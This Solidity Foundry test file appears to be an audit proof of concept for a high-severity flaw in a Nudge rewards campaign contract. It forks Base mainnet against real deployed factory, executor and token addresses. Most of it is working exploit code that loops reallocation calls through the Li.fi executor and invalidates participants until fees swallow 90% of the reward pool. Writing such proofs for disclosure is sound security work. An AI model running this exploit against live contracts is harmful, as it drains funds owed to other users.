// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {NudgeCampaign} from "../campaign/NudgeCampaign.sol";
import {NudgeCampaignFactory} from "../campaign/NudgeCampaignFactory.sol";
import {INudgeCampaign, IBaseNudgeCampaign} from "../campaign/interfaces/INudgeCampaign.sol";
import "../mocks/TestERC20.sol";
import {console} from "forge-std/console.sol";

//High Issue: Demo Campaign admin can drain/withdraw pending rewards from other user.
contract H01DebugTest is Test {
    using Math for uint256;
    //@ Using this transaction as Fork sample
    //https://basescan.org/tx/0xe11e8013db2118413b91e9281dd253ab0cb4dcb3782567262ab362aebdb7d033

    address internal constant NATIVE_ASSETID = address(0); //address(0)

    NudgeCampaignFactory public factory = NudgeCampaignFactory(0xbe915C930437302162621ad948289F4DE84c9F20);
    IExecutor public executor = IExecutor(0x4DaC9d1769b9b304cb04741DCDEb2FC14aBdF110);
    address operator = 0xc4fb807785A80Bae2151950a6C4d03b2fF694118;

    ERC20 public USDC = ERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    ERC20 public DAI = ERC20(0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb);

    address constant NATIVE_TOKEN = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function setUp() public {
        //fork Base at 27754800
        uint256 forkBlock = 27754800;
        string memory rpcURL =
            "https://rpc.ankr.com/base/9f6e5db150bd7716e21a60eb9acc6f3909c10e43797deb81c8f8d9cc60dcaecc"; //@random free EVM account
        uint256 forkId = vm.createFork(rpcURL, forkBlock);
        vm.selectFork(forkId);

        console.log("----------");

        vm.label(address(factory), "NudgeCampaignFactory");
        vm.label(address(executor), "Li.fi Executor");
    }

    function test_debug() public {
        uint256 rewardPPQ = 1e15; //for 1 DAI for 1 USDC reward token
        address targetToken = address(DAI);
        address rewardToken = address(USDC);
        uint256 initialRewardAmount = 10_000e6;

        //fund rewards with 10_000 USDC
        deal(address(USDC), address(this), initialRewardAmount);
        ERC20(rewardToken).approve(address(factory), type(uint256).max);
        address newCampaign = factory.deployAndFundCampaign(
            7 days, targetToken, rewardToken, rewardPPQ, address(this), 0, address(this), initialRewardAmount, 0
        );
        NudgeCampaign campaign = NudgeCampaign(payable(newCampaign));

        console.log("new campagin claimable rewards %e", campaign.claimableRewardAmount());

        address exploiter = makeAddr("exploter");
        vm.startPrank(exploiter);
        ERC20(targetToken).approve(executor.erc20Proxy(), type(uint256).max);
        ERC20(targetToken).approve(address(executor), type(uint256).max);
        vm.stopPrank();

        uint256 startTargetTokenBalance = 1000e18; //1e18 DAI = 1e6 USDC
        deal(address(targetToken), exploiter, startTargetTokenBalance);

        //starting rewards is 10_000 USDC, exploit until fee accumulated become 9_000 USDC. When it suppose only 10%
        while (campaign.accumulatedFees() < initialRewardAmount * 9 / 10) {
            console.log("--- reallocate all rewards by exploiter");
            for (uint256 i = 0; i < 10; i++) {
                uint256 maximumRewards = campaign.getRewardAmountIncludingFees(startTargetTokenBalance);
                uint256 claimableRewards = campaign.claimableRewardAmount();
                uint256 inputTargetToken = claimableRewards > maximumRewards
                    ? startTargetTokenBalance
                    : getTargetAmount(campaign, claimableRewards);
                if(inputTargetToken == 0) {
                    break;
                }

                console.log("send %e targetToken to campaign", inputTargetToken);
                IExecutor.SwapData[] memory swapData = getSwapData(campaign, exploiter, inputTargetToken);
                // call campaign reallocate for rewards
                vm.prank(exploiter);
                executor.swapAndExecute(
                    bytes32(0), swapData, address(targetToken), payable(exploiter), inputTargetToken
                );
            }
            console.log("--- invalidate all participants due to not enough token balance");
            invalidateAllParticipants(campaign);
        }
        console.log("claimable rewards %e", campaign.claimableRewardAmount());
        console.log("pending rewards %e", campaign.pendingRewards());
        console.log("total fee %e", campaign.accumulatedFees());
        console.log("totalReallocatedAmount %e", campaign.totalReallocatedAmount());
    }

    function invalidateAllParticipants(NudgeCampaign campaign) public {
        uint256 totalParticipants = campaign.pID();
        uint256[] memory pids = new uint256[](totalParticipants);

        for (uint256 i = 0; i < totalParticipants; i++) {
            pids[i] = i;
        }
        vm.prank(operator);
        campaign.invalidateParticipations(pids);
    }

    function getSwapData(NudgeCampaign campaign, address exploiter, uint256 inputTargetToken)
        public
        view
        returns (IExecutor.SwapData[] memory)
    {
        IExecutor.SwapData[] memory swapData = new IExecutor.SwapData[](1);
        uint256 campaignId = campaign.campaignId();
        address targetToken = campaign.targetToken();
        bytes memory encodedHandleReallocation = abi.encodeWithSelector(
            NudgeCampaign.handleReallocation.selector,
            campaignId,
            exploiter,
            address(targetToken),
            inputTargetToken,
            bytes("0x")
        );
        swapData[0] = IExecutor.SwapData({
            callTo: address(campaign),
            approveTo: address(campaign),
            sendingAssetId: address(targetToken),
            receivingAssetId: address(targetToken),
            fromAmount: inputTargetToken,
            callData: encodedHandleReallocation,
            requiresDeposit: false
        });

        return swapData;
    }

    function getTargetAmount(NudgeCampaign campaign, uint256 fromAmount) public view returns (uint256) {
        uint256 scaledAmount = fromAmount * campaign.rewardScalingFactor();
        uint256 targetAmountScaled = scaledAmount.mulDiv(1e15, campaign.rewardPPQ());
        return targetAmountScaled / campaign.targetScalingFactor();
    }
}

interface IExecutor {
    struct SwapData {
        address callTo;
        address approveTo;
        address sendingAssetId;
        address receivingAssetId;
        uint256 fromAmount;
        bytes callData;
        bool requiresDeposit;
    }

    function swapAndCompleteBridgeTokens(
        bytes32 _transactionId,
        SwapData[] calldata _swapData,
        address _transferredAssetId,
        address payable _receiver
    ) external payable;
    function swapAndExecute(
        bytes32 _transactionId,
        SwapData[] calldata _swapData,
        address _transferredAssetId,
        address payable _receiver,
        uint256 _amount
    ) external payable;
    function erc20Proxy() external returns (address);
}
